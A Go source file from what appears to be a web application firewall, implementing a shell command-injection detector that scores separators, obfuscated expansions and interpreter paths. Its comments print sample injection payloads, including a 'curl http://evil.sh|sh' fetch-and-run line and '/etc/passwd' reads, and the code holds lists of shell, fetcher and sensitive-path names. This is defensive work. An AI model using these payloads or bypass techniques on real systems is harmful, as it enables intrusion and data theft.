// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

// Package shelli detects command injection by reading shell structure rather
// than by matching command names.
//
// # Why a list of command names loses
//
// The rule this replaces matched literal command names, and four payloads walked
// straight through it — each one a technique that has been in use for years:
//
//	/???/c?t /etc/p?sswd            glob obfuscation: no command name present
//	echo Y2F0…|base64 -d|sh         the command arrives encoded
//	curl http://evil.sh|sh          fetch and pipe into an interpreter
//	${PATH:0:1}etc${PATH:0:1}passwd substring expansion builds "/etc/passwd"
//
// No literal list can fix these, because none of them contains the literal. The
// shell will happily assemble a command from wildcards, from variable slices,
// from quoted fragments — "c'a't" and "c\at" both run cat — and from base64 that
// only becomes a command after another process decodes it. Enumerating payloads
// against a language with this much expansion machinery is not a race that can
// be won.
//
// # What is actually being read
//
// Position, as in detect/xss. A command name means nothing on its own: "id",
// "less", "who", "find", and "sort" are ordinary English words, and a value
// containing "cat" is usually about an animal. What matters is a name appearing
// in *command position* — immediately after a separator that starts a new
// command:
//
//	first; second; third        prose: "second" is not a command
//	1.1.1.1; cat /etc/passwd    injection: "cat" is, and it follows ';'
//
// Around that sit the obfuscation signals, each chosen because it has no
// benign reading in user input: ${IFS}, ${VAR:0:1} substring expansion, $'\x63'
// ANSI-C quoting, brace expansion of a command, and a path built mostly from
// wildcards. Command-position tokens are unquoted before matching, so "c'a't"
// and "c\at" are read as what the shell will run.
//
// # A whole value that is a command line is not an injected one
//
// Injection means a *separator* introduced a command into a field that already
// held something else: a hostname, an ID, a filename. The value starts as data
// and turns into a command partway through.
//
// A field whose value is a command line from its first byte is a different
// thing. A CI pipeline API receives "cat VERSION | tr -d" in a run field
// because running it is the product; an automation platform stores
// "base64 -d < k.b64 && chmod 600 k" the same way. Calibration measured the
// cost of ignoring the distinction at one benign request in a hundred and
// forty.
//
// So when the first token is itself a command — or an interpreter path — the
// value is read as a stored command line and its internal separators stop
// being evidence. Nothing is lost: an injected payload virtually never begins
// with a bare command name, because the field held legitimate data first. A
// value that *is* only "cat /etc/passwd" still reports, because the sensitive
// path corroborates on its own.
//
// # A limit worth stating
//
// Backtick substitution around a single bare word is not reported. "`id`" is
// command substitution, and it is also how everyone writes inline code in
// Markdown — "use the `id` field to reference it" is a sentence, and blocking it
// makes the firewall an obstacle to the people documenting the system. Backticks
// count once the substitution contains an actual invocation: a second token, a
// path, or a separator. "$(id)" has no such benign reading and is reported.
package shelli

import (
	"sort"

	"github.com/gsoultan/gwaf/internal/scan"
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/types"
)

// Signal is one piece of structural evidence.
type Signal uint16

// Signals.
const (
	// SignalCommandPosition is a known command name immediately after a
	// separator that starts a new command. This is the core signal, and the
	// position is what makes it usable: the same names appear constantly as
	// ordinary words when nothing precedes them.
	SignalCommandPosition Signal = 1 << iota

	// SignalInterpreterPath is an absolute path to a shell or interpreter —
	// /bin/sh, /usr/bin/python. A value naming one is not describing a file.
	SignalInterpreterPath

	// SignalIFSSeparator is $IFS or ${IFS}, used to write a command without
	// typing a space. It has no meaning outside a shell and no benign reading
	// in user input at all.
	SignalIFSSeparator

	// SignalSubstringExpansion is ${VAR:0:1}, which slices a variable to build
	// a string a character at a time — the way "/etc/passwd" is spelled without
	// a slash. Distinct from ${VAR:-default}, which is ordinary documentation.
	SignalSubstringExpansion

	// SignalANSIQuoting is $'\x63\x61\x74', which spells a command in hex.
	SignalANSIQuoting

	// SignalGlobCommand is a path token built mostly from ? and * wildcards, as
	// in /???/c?t. A human writing a glob uses one wildcard and a real name.
	SignalGlobCommand

	// SignalVariableCommand is a bare variable expansion in command position,
	// as in the "$a$b" of "a=c;b=at;$a$b". Weak: the shape also appears in
	// ordinary shell documentation.
	SignalVariableCommand

	// SignalSensitivePath is a path that is only ever interesting to an
	// attacker — /etc/passwd, /etc/shadow, /proc/self/environ. Weak, because
	// prose and configuration discuss these files legitimately.
	SignalSensitivePath
)

// String implements fmt.Stringer so a decision can say what it saw.
func (s Signal) String() string {
	var out []byte
	add := func(n string) {
		if len(out) > 0 {
			out = append(out, '+')
		}
		out = append(out, n...)
	}
	if s&SignalCommandPosition != 0 {
		add("command_position")
	}
	if s&SignalInterpreterPath != 0 {
		add("interpreter_path")
	}
	if s&SignalIFSSeparator != 0 {
		add("ifs_separator")
	}
	if s&SignalSubstringExpansion != 0 {
		add("substring_expansion")
	}
	if s&SignalANSIQuoting != 0 {
		add("ansi_quoting")
	}
	if s&SignalGlobCommand != 0 {
		add("glob_command")
	}
	if s&SignalVariableCommand != 0 {
		add("variable_command")
	}
	if s&SignalSensitivePath != 0 {
		add("sensitive_path")
	}
	if len(out) == 0 {
		return "none"
	}
	return string(out)
}

// Threshold is the score at or above which a value is reported.
const Threshold = 5

// weightOf prices each signal by what it means alone.
//
// The strong signals reach the threshold by themselves because none has a
// benign reading in user input: nobody types ${IFS} or /???/c?t by accident.
// The two weak ones exist to corroborate — a bare variable in command position
// and a mention of /etc/passwd are each ordinary on their own, and together
// they are "a=c;b=at;$a$b /etc/passwd".
func weightOf(s Signal) int {
	switch s {
	case SignalCommandPosition, SignalInterpreterPath, SignalIFSSeparator,
		SignalSubstringExpansion, SignalANSIQuoting, SignalGlobCommand:
		return 5
	case SignalVariableCommand, SignalSensitivePath:
		return 3
	default:
		return 0
	}
}

// commands are names that mean something in command position.
//
// Many are ordinary English words — id, less, who, find, sort, head, at, env.
// That is precisely why the list is only consulted in command position; used
// anywhere else it would block half of all prose.
var commands = map[string]bool{
	// Hashing utilities, which are how a blind RCE proof is usually taken:
	// "echo -n X|md5sum" returns a value the attacker can predict, so it proves
	// execution without needing output of its own.
	//
	// The list is md5sum and sha1sum only, and that is the calibration corpus
	// talking rather than taste. "sha256sum" and "timeout" were here and are
	// gone: real GitLab CI steps run "tar czf artifacts.tar.gz dist/ &&
	// sha256sum artifacts.tar.gz" and "&& timeout 600 npm test", both in command
	// position and both entirely benign, and rule 4910 went from under its 0.1%
	// ceiling to 0.296% on 10,473 benign requests. A checksum an attacker uses
	// to prove execution is one a build pipeline uses to publish an artifact;
	// where the two overlap, the pipeline wins, because it is the traffic that
	// exists.
	"md5sum": true, "sha1sum": true,
	// Shells and interpreters. Piping into one of these is the payload.
	"sh": true, "bash": true, "zsh": true, "ksh": true, "csh": true,
	"tcsh": true, "dash": true, "ash": true, "busybox": true,
	"python": true, "python2": true, "python3": true, "perl": true,
	"ruby": true, "php": true, "node": true, "lua": true, "tclsh": true,
	"powershell": true, "pwsh": true, "cmd": true, "wscript": true,

	// Fetchers: the second stage of nearly every real compromise.
	"curl": true, "wget": true, "nc": true, "ncat": true, "netcat": true,
	"socat": true, "ftp": true, "tftp": true, "scp": true, "ssh": true,
	"rsync": true, "telnet": true,

	// Readers and decoders.
	"cat": true, "tac": true, "head": true, "tail": true, "less": true,
	"more": true, "strings": true, "od": true, "xxd": true, "base64": true,
	"base32": true, "uudecode": true, "nl": true, "rev": true,

	// Reconnaissance.
	"id": true, "whoami": true, "uname": true, "hostname": true,
	"ps": true, "netstat": true, "ifconfig": true, "env": true,
	"printenv": true, "who": true, "w": true, "last": true, "lsof": true,
	"ss": true, "arp": true, "route": true,

	// Filesystem and execution.
	"ls": true, "dir": true, "find": true, "rm": true, "mv": true,
	"cp": true, "chmod": true, "chown": true, "kill": true, "killall": true,
	"eval": true, "exec": true, "sudo": true, "su": true, "nohup": true,
	"mkfifo": true, "mknod": true, "touch": true, "ln": true,

	// Text tools used to exfiltrate or assemble.
	"grep": true, "egrep": true, "awk": true, "sed": true, "sort": true,
	"uniq": true, "cut": true, "tr": true, "xargs": true, "tee": true,

	// Timing, resolution, and scheduling.
	"echo": true, "printf": true, "sleep": true, "ping": true, "dig": true,
	"nslookup": true, "host": true, "crontab": true, "at": true,
}

// interpreters are the basenames that make an absolute path dangerous.
var interpreters = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "ksh": true, "csh": true,
	"dash": true, "ash": true, "busybox": true, "python": true,
	"python2": true, "python3": true, "perl": true, "ruby": true,
	"php": true, "node": true, "nc": true, "ncat": true, "netcat": true,
}

// sensitivePaths are only ever interesting to an attacker.
var sensitivePaths = []string{
	"/etc/passwd", "/etc/shadow", "/etc/sudoers", "/proc/self/environ",
	"/proc/self/cmdline", "/root/.ssh", "/.aws/credentials",
	"/.ssh/id_rsa", "/etc/hosts", "/var/log/auth.log",
}

// Verdict is the result of analysing one value.
type Verdict struct {
	Signals Signal
	Score   int
	Span    types.Span
}

// Detected reports whether the evidence reached the threshold.
func (v Verdict) Detected() bool { return v.Score >= Threshold }

// Detector analyses values for command injection.
//
// A Detector is immutable and safe for concurrent use.
type Detector struct{}

// New returns a Detector.
func New() *Detector { return &Detector{} }

// Name implements the operator contract.
func (*Detector) Name() string { return "detect_shelli" }

// maxScan bounds how much of a value is analysed. Every signal is local to one
// command, so a payload needing more than this does not exist.
const maxScan = 64 << 10

// maxTokenLen bounds an unquoted command-position token. A command name is
// never this long, so a longer run cannot be one.
const maxTokenLen = 32

// Analyze scores value and returns the verdict.
func (d *Detector) Analyze(value []byte) Verdict {
	return d.AnalyzeIn(value, false)
}

// AnalyzeIn scores value, told whether it arrived in a parameter the
// application hands to a shell.
//
// The flag lifts one suppression and nothing else. isStoredCommandLine exists
// because a value that is a command line from its first byte is usually a
// command line somebody stored -- "cat VERSION | tr" in a CI field -- and
// reading its own separators as injection points would block every build
// configuration in existence. But when the parameter is named cmd, exec or
// shell, that reading belongs to the attacker: an application that takes such a
// parameter and passes it to a shell is the bug, and "echo -n X|md5sum" arriving
// there is the proof-of-concept, not a saved pipeline.
//
// It lifts a suppression, it does not lower the bar. "cmd=list" is how half of
// all admin UIs are written and still scores nothing, because "list" is not a
// command line.
func (d *Detector) AnalyzeIn(value []byte, commandSink bool) Verdict {
	if len(value) == 0 {
		return Verdict{}
	}
	src := value
	if len(src) > maxScan {
		src = src[:maxScan]
	}

	var sigs Signal
	var span types.Span
	found := false

	mark := func(s Signal, off, n int) {
		sigs |= s
		if !found && weightOf(s) > 0 {
			span = types.SpanOf(off, n)
			found = true
		}
	}

	scanExpansions(src, mark)
	scanPaths(src, mark)

	// Separators inside a value that is already a command line are that
	// command's own syntax, not an injection point. Paths are still read above:
	// "/bin/sh -c id" arriving in a request value is the most conclusive RCE
	// shape there is, and an application that stores one on purpose needs a
	// scoped exception rather than a quieter detector.
	if commandSink || !isStoredCommandLine(src) {
		scanCommandPositions(src, mark)
	}
	// A command sink is also the one place a bare invocation counts: the whole
	// value being "cat /etc/passwd" is the payload, and there is no separator in
	// front of it to anchor the ordinary scan.
	if commandSink {
		if end, word := commandWord(src, leadingSpace(src)); end > 0 && word != "" &&
			(end == len(src) || isSpace(src[end])) && commands[word] {
			mark(SignalCommandPosition, leadingSpace(src), end-leadingSpace(src))
		}
	}

	total := 0
	for bit := Signal(1); bit != 0; bit <<= 1 {
		if sigs&bit != 0 {
			total += weightOf(bit)
		}
	}
	return Verdict{Signals: sigs, Score: total, Span: span}
}

// scanExpansions looks for the shell expansions that have no benign reading.
func scanExpansions(src []byte, mark func(Signal, int, int)) {
	for i := 0; i < len(src); i++ {
		if src[i] != '$' {
			continue
		}
		rest := src[i+1:]

		switch {
		case hasPrefix(rest, "IFS"), hasPrefix(rest, "{IFS}"):
			mark(SignalIFSSeparator, i, 4)

		case len(rest) > 0 && rest[0] == '\'':
			// $'\x63' — ANSI-C quoting spells a command in escapes. Requiring
			// an escape keeps ordinary "$'text'" out.
			if j := indexByte(rest, '\''); j >= 0 && indexByte(rest[1:], '\\') >= 0 {
				mark(SignalANSIQuoting, i, 2)
			}

		case len(rest) > 0 && rest[0] == '{':
			// ${VAR:0:1} slices a variable to build a string a character at a
			// time. ${VAR:-default} and ${VAR:?msg} are documentation, so the
			// byte after the colon has to be a digit.
			if n, ok := substringExpansion(rest); ok {
				mark(SignalSubstringExpansion, i, n)
			}
		}
	}
}

// substringExpansion reports the length of a ${VAR:digit...} expansion at the
// start of rest, which must begin with '{'.
func substringExpansion(rest []byte) (int, bool) {
	j := 1
	for j < len(rest) && isWordByte(rest[j]) {
		j++
	}
	if j == 1 || j >= len(rest) || rest[j] != ':' {
		return 0, false
	}
	j++
	if j >= len(rest) || !isDigit(rest[j]) {
		return 0, false
	}
	return j + 1, true
}

// scanCommandPositions walks separators and reads the token that follows each.
func scanCommandPositions(src []byte, mark func(Signal, int, int)) {
	for i := 0; i < len(src); i++ {
		sepLen, backtick := separatorAt(src, i)
		if sepLen == 0 {
			continue
		}

		j := i + sepLen
		for j < len(src) && isSpace(src[j]) {
			j++
		}
		// Brace expansion opens a command position without a space:
		// ";{cat,/etc/passwd}" runs cat. Reading it here rather than as its own
		// signal is what lets "{" stay out of the literal set, and every JSON
		// body starts with "{".
		if j < len(src) && src[j] == '{' {
			j++
		}
		if j >= len(src) {
			return
		}

		// A path token built mostly of wildcards is a command whose name was
		// never typed: /???/c?t.
		if end, wilds := globToken(src, j); wilds >= 2 {
			mark(SignalGlobCommand, j, end-j)
			i = end - 1
			continue
		}

		// An absolute path standing where a command belongs: "; /usr/bin/id".
		// commandWord stops at the leading '/' and returns nothing, and
		// scanPaths only resolves basenames against the interpreter list, so
		// "/usr/bin/id" and "| /usr/bin/curl evil.test" were reaching the
		// backend while the bare "; id" was blocked — writing out the full path
		// was the whole bypass.
		//
		// Resolved here rather than in scanPaths because *command position* is
		// what makes it safe: the basename is only consulted after a separator,
		// so a URL like "/api/v1/ping" in an ordinary value is untouched. That
		// is the distinction that lets the whole command vocabulary be used
		// here, where scanPaths can only afford the interpreters.
		if end, base := pathCommandWord(src, j); base != "" {
			if commands[base] || interpreters[base] {
				mark(SignalCommandPosition, j, end-j)
				i = end - 1
				continue
			}
		}

		end, word := commandWord(src, j)
		switch {
		case word == "" && j < len(src) && src[j] == '$':
			// A bare variable expansion standing where a command belongs.
			mark(SignalVariableCommand, j, 2)

		case commands[word]:
			// Backtick substitution around a single bare word is Markdown far
			// more often than it is an attack, so it needs a real invocation:
			// a second token, a path, or another separator.
			//
			// A concatenation heuristic -- flag it when the backtick is joined to
			// preceding data, since prose is space-delimited -- was built and
			// measured, and rejected: it false-positived on 9/9 realistic benign
			// values, because "localhost`id`" (attack) and "config`env`" (a JS
			// tagged template) are the same shape word`command`, distinguishable
			// only by field context this detector deliberately does not keep. See
			// TestBacktickLimitIsDeliberate and .serena/memories/decisions.md.
			if backtick && !isInvocation(src, end) {
				continue
			}
			mark(SignalCommandPosition, j, end-j)
		}
		if end > j {
			i = end - 1
		}
	}
}

// separatorAt reports the length of a command separator at i, and whether it
// was a backtick — which is held to a higher bar by the caller.
func separatorAt(src []byte, i int) (n int, backtick bool) {
	switch src[i] {
	case ';', '\n', '|', '&':
		// "||" and "&&" are one separator, not two.
		if i+1 < len(src) && src[i+1] == src[i] {
			return 2, false
		}
		if src[i] == ';' && mediaTypeParamAt(src, i) {
			// Not a command separator: a media-type parameter separator.
			return 0, false
		}
		return 1, false
	case '`':
		return 1, true
	case '$':
		if i+1 < len(src) && src[i+1] == '(' {
			return 2, false
		}
	}
	return 0, false
}

// ianaTopLevelTypes is the complete registry of top-level media types.
//
// It is closed and has not grown in years, which is what makes it usable as a
// discriminator: "image/png" is a media type and "uploads/img.png" is a path,
// and only the first half tells them apart.
// Kept as a slice of byte strings rather than a map because this is hot-path
// code and a map lookup would need a []byte-to-string conversion (CLAUDE.md §4).
var ianaTopLevelTypes = [][]byte{
	[]byte("application"), []byte("audio"), []byte("font"), []byte("example"),
	[]byte("image"), []byte("message"), []byte("model"), []byte("multipart"),
	[]byte("text"), []byte("video"), []byte("haptics"),
}

// equalFoldASCII compares without allocating, which strings.EqualFold on a
// converted []byte would not manage.
func equalFoldASCII(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		x, y := a[i], b[i]
		if x >= 'A' && x <= 'Z' {
			x += 'a' - 'A'
		}
		if y >= 'A' && y <= 'Z' {
			y += 'a' - 'A'
		}
		if x != y {
			return false
		}
	}
	return true
}

// mediaTypeParamAt reports whether the semicolon at i separates media-type
// parameters rather than shell commands.
//
// "data:image/png;base64,iVBOR..." was a false positive, and a bad one: the
// semicolon is a separator, "base64" is in the command list because
// "echo …|base64 -d|sh" is a real technique, and the two together read as
// command injection. An avatar upload, an inline logo, or any embedded image is
// that shape, and the benign corpus found it the day it first contained one.
//
// Suppressing it needs to be narrow in *both* directions, because a semicolon
// after a slash-separated token is also how real injection reaches a file
// parameter -- "?f=uploads/img.png;cat /etc/passwd". So both sides must match
// the media-type grammar of RFC 2045: a registered top-level type before the
// semicolon, and an actual parameter after it. "text/plain;cat /etc/passwd"
// fails the second test and is still reported.
func mediaTypeParamAt(src []byte, i int) bool {
	// Left: <toplevel>/<subtype>, immediately before the semicolon.
	j := i
	for j > 0 && isSpace(src[j-1]) {
		j--
	}
	end := j
	for j > 0 && (isWordByte(src[j-1]) || src[j-1] == '.' || src[j-1] == '+' || src[j-1] == '-') {
		j--
	}
	if j == end || j == 0 || src[j-1] != '/' {
		return false
	}
	slash := j - 1
	k := slash
	for k > 0 && isWordByte(src[k-1]) {
		k--
	}
	if k == slash {
		return false
	}
	known := false
	for _, t := range ianaTopLevelTypes {
		if equalFoldASCII(src[k:slash], t) {
			known = true
			break
		}
	}
	if !known {
		return false
	}

	// Right: "base64" ending the parameter, or a name=value pair.
	r := i + 1
	for r < len(src) && isSpace(src[r]) {
		r++
	}
	st := r
	for r < len(src) && (isWordByte(src[r]) || src[r] == '-') {
		r++
	}
	if r == st {
		return false
	}
	if r < len(src) && src[r] == '=' {
		return true // charset=utf-8, boundary=..., filename=...
	}
	if equalFoldASCII(src[st:r], []byte("base64")) {
		// The transfer encoding, which must be followed by the data comma or
		// end the value. ";base64 -d" is not this.
		return r == len(src) || src[r] == ',' || src[r] == ';'
	}
	return false
}

// isInvocation reports whether what follows a command name looks like an actual
// invocation rather than a bare mention: an argument, a path, or a separator.
func isInvocation(src []byte, i int) bool {
	for ; i < len(src); i++ {
		switch {
		case src[i] == '`':
			// Closed with nothing in between but the name itself.
			return false
		case isSpace(src[i]):
			continue
		case src[i] == '/', src[i] == '-', src[i] == ';', src[i] == '|',
			src[i] == '&', src[i] == '$', isWordByte(src[i]):
			return true
		}
	}
	return false
}

// commandWord reads the token at i and returns it with quoting removed.
//
// Unquoting is the point: the shell runs "c'a't" and "c\at" as cat, so a
// detector reading the bytes verbatim sees neither.
func commandWord(src []byte, i int) (end int, word string) {
	var buf [maxTokenLen]byte
	n := 0

	for ; i < len(src); i++ {
		c := src[i]
		switch {
		case c == '\'' || c == '"':
			continue
		case c == '\\':
			// A backslash quotes the next byte, which is how "c\at" runs cat.
			continue
		case isWordByte(c):
			if n < len(buf) {
				buf[n] = fold(c)
				n++
			}
		default:
			return i, string(buf[:n])
		}
	}
	return i, string(buf[:n])
}

// pathCommandWord reads an absolute path token at i and returns its final
// component, which is the name the shell actually executes.
//
// "/usr/bin/id" runs id and "/bin/../bin/cat" runs cat, so the last component is
// the command however many directories precede it. Quotes and backslashes are
// skipped for the same reason commandWord skips them: the shell removes them
// before resolving the path, so "/bin/c'a't" is cat.
//
// It returns "" for anything that is not an absolute path, for a path ending in
// a separator, and for one whose last component is empty — none of those name a
// command.
func pathCommandWord(src []byte, i int) (end int, word string) {
	if i >= len(src) || src[i] != '/' {
		return i, ""
	}

	var buf [maxTokenLen]byte
	n := 0
	sawComponent := false

	for ; i < len(src); i++ {
		c := src[i]
		switch {
		case c == '\'' || c == '"' || c == '\\':
			continue
		case c == '/':
			// A new component begins: whatever was accumulated was a directory.
			n = 0
			sawComponent = true
		case isWordByte(c) || c == '.' || c == '-':
			if n < len(buf) {
				buf[n] = fold(c)
				n++
			}
		default:
			return i, pathWord(buf[:n], sawComponent)
		}
	}
	return i, pathWord(buf[:n], sawComponent)
}

func pathWord(b []byte, sawComponent bool) string {
	if !sawComponent || len(b) == 0 {
		return ""
	}
	return string(b)
}

// globToken reports the end of a path-like token at i and how many wildcard
// bytes it contains.
func globToken(src []byte, i int) (end int, wildcards int) {
	start := i
	letters := 0

	// One exit, so every result is validated. An earlier version returned
	// directly on hitting a separator, which skipped the checks below entirely:
	// an ordinary Accept header — "…;q=0.9,image/avif,*/*;q=0.8" — was read as
	// a token with two wildcards and reported, blocking every browser that
	// sends one.
scan:
	for i < len(src) && !isSpace(src[i]) {
		switch src[i] {
		case '?', '*':
			wildcards++
		case ';', '|', '&', '`':
			break scan
		default:
			if isWordByte(src[i]) {
				letters++
			}
		}
		i++
	}

	switch {
	case letters == 0:
		// Pure punctuation globs nothing. "*/*" is a media range, not a command
		// whose name was hidden.
		return i, 0
	case wildcards*4 < i-start:
		// A lone wildcard is a glob someone typed; a token that is mostly
		// wildcards is a command name that was deliberately not typed.
		return i, 0
	default:
		return i, wildcards
	}
}

// isStoredCommandLine reports whether the value is a command line from its
// first byte, rather than data that a separator turned into one.
//
// Only the first token is consulted. "cat VERSION | tr" is a pipeline someone
// saved; "1.1.1.1; cat /etc/passwd" is a hostname field with a command appended
// to it, and the difference is entirely in what comes first.
func isStoredCommandLine(src []byte) bool {
	i := 0
	for i < len(src) && isSpace(src[i]) {
		i++
	}
	if i >= len(src) {
		return false
	}

	// An absolute interpreter path: "/bin/sh -c ...", "/usr/bin/python x.py".
	if src[i] == '/' {
		j := i
		for j < len(src) && !isSpace(src[j]) {
			j++
		}
		seg := src[i:j]
		for k := len(seg) - 1; k >= 0; k-- {
			if seg[k] == '/' {
				return interpreters[plainWord(seg[k+1:])]
			}
		}
		return false
	}

	end, word := commandWord(src, i)
	if end == i || word == "" {
		return false
	}
	// It must be a bare invocation, not a value that happens to start with a
	// command name followed by punctuation: "cat," and "id=5" are not commands.
	if end < len(src) && !isSpace(src[end]) {
		return false
	}
	return commands[word]
}

// scanPaths looks for interpreter paths and sensitive files.
func scanPaths(src []byte, mark func(Signal, int, int)) {
	for i := 0; i < len(src); i++ {
		if src[i] != '/' {
			continue
		}
		j := i + 1
		for j < len(src) && isWordByte(src[j]) {
			j++
		}
		// Compared without folding case, and that is a correctness decision
		// rather than an optimisation. "/bin/SH" does not resolve on a
		// case-sensitive filesystem, so folding would add surface with no
		// corresponding attack — and it would break the prefilter, because the
		// declared literals are the lowercase paths. The fuzz harness found
		// exactly that: "0/nC" scored as an interpreter path while no literal
		// covered it, so the rule could never have fired on it in practice.
		// What follows the name decides whether it *is* the executable or merely
		// a directory or a stem. "/bin/sh" ends there; "/static/js/node.min.js"
		// continues into an extension and "/js/node/x" into another component,
		// and neither runs an interpreter. Without this the signal fired on any
		// URL carrying a bundled asset — /static/js/node.min.js is on a large
		// share of the web — and it is worth 5 on its own, so it blocked.
		if j < len(src) && (src[j] == '.' || src[j] == '/') {
			continue
		}
		if interpreters[plainWord(src[i+1:j])] && i > 0 && src[i-1] != ' ' {
			// Preceded by a path component, so this is /bin/sh rather than a
			// sentence that happens to contain "/sh".
			mark(SignalInterpreterPath, i, j-i)
		}
	}
	for _, p := range sensitivePaths {
		if j := indexFolded(src, p); j >= 0 {
			mark(SignalSensitivePath, j, len(p))
		}
	}
}

// ---- byte helpers -----------------------------------------------------------

func fold(c byte) byte {
	if c >= 'A' && c <= 'Z' {
		return c + ('a' - 'A')
	}
	return c
}

func isWordByte(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
		(c >= '0' && c <= '9') || c == '_'
}

func isDigit(c byte) bool { return c >= '0' && c <= '9' }

func isSpace(c byte) bool {
	switch c {
	case ' ', '\t', '\n', '\r', '\v', '\f':
		return true
	}
	return false
}

func indexByte(b []byte, c byte) int {
	for i := range b {
		if b[i] == c {
			return i
		}
	}
	return -1
}

func hasPrefix(b []byte, s string) bool {
	if len(b) < len(s) {
		return false
	}
	for i := range len(s) {
		if b[i] != s[i] {
			return false
		}
	}
	return true
}

func indexFolded(b []byte, s string) int {
	for i := 0; i+len(s) <= len(b); i++ {
		ok := true
		for k := range len(s) {
			if fold(b[i+k]) != s[k] {
				ok = false
				break
			}
		}
		if ok {
			return i
		}
	}
	return -1
}

// plainWord returns a short token verbatim, without folding case.
func plainWord(w []byte) string {
	if len(w) == 0 || len(w) > maxTokenLen {
		return ""
	}
	return string(w)
}

// ---- operator ---------------------------------------------------------------

// Operator adapts the detector to the rule engine, so it is prefiltered,
// metered, and reported like every other rule.
func Operator() rules.Operator { return &operator{d: New(), threshold: Threshold} }

// OperatorAt returns an operator that reports at a caller-chosen score.
//
// This is how a rule earns a confidence tier below High out of the *same*
// evidence, rather than by writing a second, sloppier detector. Lower is more
// sensitive and less certain; a ruleset that lowers it is opting into false
// positives it has decided it can absorb, and that decision belongs to whoever
// runs the traffic.
func OperatorAt(threshold int) rules.Operator {
	return &operator{d: New(), threshold: threshold}
}

type operator struct {
	d         *Detector
	threshold int
}

func (o *operator) Name() string { return "detect_shelli" }

// Eval scores the value, covering all of it rather than its first maxScan bytes.
//
// The windowing is the fix for a padding bypass. AnalyzeIn bounds its work at
// maxScan and used to do it by truncating, which is sound reasoning about how
// long a payload is and wrong about where it sits: ";whoami" after 128 KiB of
// ordinary text scored nothing, while the same bytes at offset zero score 5.
// See internal/scan.
func (o *operator) Eval(ctx *rules.EvalContext, value []byte) (rules.Match, bool) {
	sink := ctx != nil && isCommandSinkParam(ctx.Key)

	var match rules.Match
	var found bool
	scan.Windows(value, maxScan, func(off int, w []byte) bool {
		v := o.d.AnalyzeIn(w, sink)
		if v.Score < o.threshold {
			return true
		}
		// The span is relative to the window; an audit log wants it relative to
		// the value the caller passed in.
		match = rules.Match{Span: types.SpanOf(off+int(v.Span.Off), int(v.Span.Len))}
		found = true
		return false
	})
	return match, found
}

// Literals are the byte sequences without which no scoring signal can fire.
//
// Selectivity is the whole difficulty here, because shell injection keys on
// punctuation that ordinary HTTP is full of. A first version declared "/" and
// "{" — which made every request path and every JSON body a candidate, and
// broke the SLO that benign traffic evaluates zero rules. Neither is needed:
//
//   - every command-position signal requires a separator, so the separators
//     cover them without "/";
//   - brace expansion is read as a command position, so "{" is unnecessary;
//   - the only signal that fires without a separator is an interpreter path,
//     so those are named specifically rather than by their leading slash.
//
// The weak signals never fire alone and always need a separator alongside, so
// they need no literals of their own. FuzzLiteralsAreExhaustive enforces all of
// this rather than trusting the reasoning.
func (o *operator) Literals() ([]string, bool) {
	return []string{
		";", "|", "&", "`", "\n",
		"${", "$'", "$(", "$IFS",
		"/sh", "/bash", "/zsh", "/ksh", "/csh", "/dash", "/ash",
		"/busybox", "/python", "/perl", "/ruby", "/php", "/node",
		"/nc", "/ncat", "/netcat",
	}, true
}

// Cost prices one analysis: three passes with local lookahead.
func (o *operator) Cost() types.Fuel { return types.CostLiteralMatch * 6 }

// leadingSpace returns the index of the first non-space byte.
func leadingSpace(src []byte) int {
	i := 0
	for i < len(src) && isSpace(src[i]) {
		i++
	}
	return i
}

// commandSinkParams are parameter names an application hands to a shell.
//
// Short and closed on purpose. Every entry lifts a false-positive suppression,
// so a wrong one costs blocked traffic -- which is why "action", "task" and
// "query" are deliberately absent even though plugins use them for the same
// thing. These are the names whose only reading is "run this".
var commandSinkParams = map[string]bool{
	"cmd": true, "command": true, "commands": true, "cmdline": true,
	"exec": true, "execute": true, "shell": true, "shell_exec": true,
	"system": true, "popen": true, "proc": true, "spawn": true,
	"ping": true, "host_cmd": true, "run_cmd": true, "do_cmd": true,
}

// isCommandSinkParam reports whether key names a parameter handed to a shell.
//
// Array-style keys arrive as "cmd[]" from PHP-shaped forms, and PHP delivers
// them as an array whose element is the value -- the same parameter, spelled
// the way a language that supports repeated fields spells it. A red-team pass
// found "cmd[]=id" walking through while "cmd=id" was blocked, which is a
// difference in notation rather than in what the application does with it.
// core.matchesParam already strips this for the other sink rules.
func isCommandSinkParam(key string) bool {
	if key == "" || len(key) > 32 {
		return false
	}
	if n := len(key); n > 2 && key[n-2] == '[' && key[n-1] == ']' {
		key = key[:n-2]
	}
	if commandSinkParams[key] {
		return true
	}
	lower := make([]byte, 0, len(key))
	for i := 0; i < len(key); i++ {
		c := key[i]
		if c >= 'A' && c <= 'Z' {
			c += 'a' - 'A'
		}
		lower = append(lower, c)
	}
	return commandSinkParams[string(lower)]
}

// SinkOperator scores the value of a parameter whose *name* says it is handed
// to a shell.
//
// # Why the ordinary operator cannot reach these
//
// It is nominated by the prefilter, which scans values for the literals this
// detector declares -- separators and interpreter paths. "cmd=id" contains
// none of them, so the rule is never a candidate and AnalyzeIn is never
// called. The detector scores "id" at exactly the threshold in sink mode and
// has done all along; nothing ever handed it the value.
//
// That gap was recorded in .serena/memories/decisions.md as an open engine
// question -- "how does a key-anchored rule get scheduled without becoming
// unconditional" -- and the answer was already in the engine. An operator can
// read its siblings, so the rule keys on the *name*: it targets ARGS_NAMES and
// declares the sink names as its literals, which the automaton matches against
// the name. Having been nominated, it fetches the value beside it.
//
// The nomination is cheap and rare because these names are specific. A form
// with no parameter called cmd, exec or shell never nominates this rule at all.
//
// # Direction of evidence
//
// The sibling value is attacker-controlled, and it is used to *convict*: a
// parameter named cmd whose value is a command line is evidence against the
// request. It never acquits. That is the direction rules.EvalContext documents
// as sound (docs/RULES.md §4).
func SinkOperator() rules.Operator { return &sinkOperator{d: New(), threshold: Threshold} }

type sinkOperator struct {
	d         *Detector
	threshold int
}

func (o *sinkOperator) Name() string { return "shelli_command_sink" }

func (o *sinkOperator) Eval(ctx *rules.EvalContext, value []byte) (rules.Match, bool) {
	// Nominated by the argument *name*, so the value handed in is the name.
	if ctx == nil || ctx.Target.Kind != types.TargetArgNames {
		return rules.Match{}, false
	}
	if !isCommandSinkParam(ctx.Key) {
		return rules.Match{}, false
	}
